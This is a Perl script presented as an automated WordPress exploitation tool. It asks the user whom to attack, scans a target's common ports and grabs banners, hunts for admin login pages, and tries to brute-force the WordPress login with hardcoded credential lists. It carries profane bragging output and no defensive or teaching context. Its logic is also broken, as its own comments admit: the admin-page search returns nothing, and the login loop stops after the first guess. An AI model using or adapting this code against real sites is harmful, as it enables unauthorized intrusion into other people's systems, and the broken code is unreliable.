#!/usr/bin/perl

########
#
# Automated WordPress exploitation tool
#
########


############################
#Built-in modules
use strict;
use warnings;
use LWP::UserAgent ();
use Net::FTP;
use IO::Socket::INET;
use Net::IP;
use HTTP::Request;
use HTML::Form;
###########################
#External modules
###########################
####
system('clear');
#Static Variables
my @ports = qw(20 21 22 23 53 67 68 69 80 88 135 139 443 445);
my $conPorts;
my $errPorts;
my $sock;
#Bot building
my $bot = LWP::UserAgent->new;
$bot->timeout(10);
$bot->agent("Mozilla/5.0 (Windows; U; Windows NT 6.1 en-US;
rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18");

my $banner = << 'EOL';
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
.___/\          __  .__                  ____.                                                      __    __________._______________________   ___ ___
|   )/_____   _/  |_|  |__   ____       |    |__ __  ____   ____   ___________  ____ _____   __ ___/  |_  \______   \   \__    ___/\_   ___ \ /   |   \
|   |/     \  \   __\  |  \_/ __ \      |    |  |  \/ ___\ / ___\_/ __ \_  __ \/    \\__  \ |  |  \   __\  |    |  _/   | |    |   /    \  \//    ~    \
|   |  Y Y  \  |  | |   Y  \  ___/  /\__|    |  |  / /_/  > /_/  >  ___/|  | \/   |  \/ __ \|  |  /|  |    |    |   \   | |    |   \     \___\    Y    /
|___|__|_|  /  |__| |___|  /\___  > \________|____/\___  /\___  / \___  >__|  |___|  (____  /____/ |__|    |______  /___| |____|    \______  /\___|_  /
          \/             \/     \/                /_____//_____/      \/           \/     \/                      \/                       \/       \/
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
EOL

#####################################

print $banner;

print "\n\n[*]Who we fucking over => ";
chomp(my $host = <STDIN>);
#print "\n\n[*]Enter the path to the list of usernames => ";
#chomp(my $user = <STDIN>);
#print "\n\n[*]Enter the path to the list of passwords => ";
#chomp(my $pass = <STDIN>);
print "++++++++++++++++++++++++++++++\n\n";

#####################################
#Info gathering
sleep(2);
print "[*]Trying to connect to common ports\n";
print "++++++++++++++++++++++++++++++\n\n";
sleep(2);

foreach my $port (@ports){
  eval {
    local $SIG{ALRM} = sub { $errPorts++; die; };
    print "[*]Trying port: ", $port, "\n";
    if($sock = IO::Socket::INET->new(PeerAddr => $host,
    PeerPort => $port,
    Proto => 'tcp')){
      if ($port == 80) {
        my $request = "HEAD / HTTP/1.1\n\n\n\n";
        print $sock $request;
        print "\n";
      }
      while(<$sock>){
        chomp;
        print "   ",$_,"\n";
      }
      print "\n";
      $conPorts++;
    }
    close($sock);
  };
}

#####################################
#Running subroutines
brute_force();
#####################################
#Start subroutine building
####
#Finding admin pages

sub admin_find {

 #array of typical admin pages
 print "++++++++++++++++++++++++++++++++++\n";
 print "[*]Hunting for an admin page\n";
 print "++++++++++++++++++++++++++++++++++\n";
  my @admins = qw(admin
  administrator
  wp-admin
  wp-login.php);
  if ($host !~ /http:\/\//) {$host = "http://$host";};

  foreach my $admin (@admins) {
	 my $hunt = $host."/".$admin."/";
	 my $req = HTTP::Request->new(GET=>$hunt);
	 my $res = $bot->request($req);
    #looks for the admin page
   if ($res->is_success) {
	    print "[*]Found the admin page!!\n";
	    print "[*]$hunt \n";
      last;
      return $hunt;
    }
	  elsif ($res->content=~/Access Denied/){
      print "[*]Found the admin page : $hunt => [Error & Access Denied]\n";
      last;
	  }
	  else {
      print "[*]Not found :(\n";
	  }
  }
}
####
#Brute force //Needs to be adjusted//Will be coming back to
sub brute_force {
  my @users = qw(admin root administrator user login security person); #support for file reading coming soon
  my @passwds = qw(password 123 admin admin123 BTekgFutvcx1L%9pbN); #support for file reading coming soon
  my $target = admin_find();
  my $username = "<input name=log />";
  my $passwordname = "<input name=pwd />";
  print "++++++++++++++++++++++++++++++++++\n";
  print "[*]Trying to break the login\n";
  print "++++++++++++++++++++++++++++++++++\n";
  #Iterating through the two arrays to try and guess the username and password
  #It sort of does what it is supposed too
  #Breaks out the loop too soon when a conditional statement is added
  foreach (@users) {
    chomp(my $user = $_);
    print "[*]Tryin user: ",$user,"\n";
    foreach (@passwds) {
        chomp(my $passwd = $_);
        print "[*]Trying password: ",$passwd,"\n";
        my %form =($username => $user,$passwordname => $passwd);
        my $res = $bot->post($target,\%form)->as_string;
        my $req = HTTP::Request->new(GET=>$target);
        #my $res = $bot->request($req);
        unless ($res !~ m/Error(.*?)\?/i) {
            print "[*]Broke dat bitch!\n\t[*]User => " . $user . "\n\t[*]Password => " . $passwd . "\n";
            print "++++++++++++++++++++++++++++++++++\n";
          }
        return;
      }
    }
  }
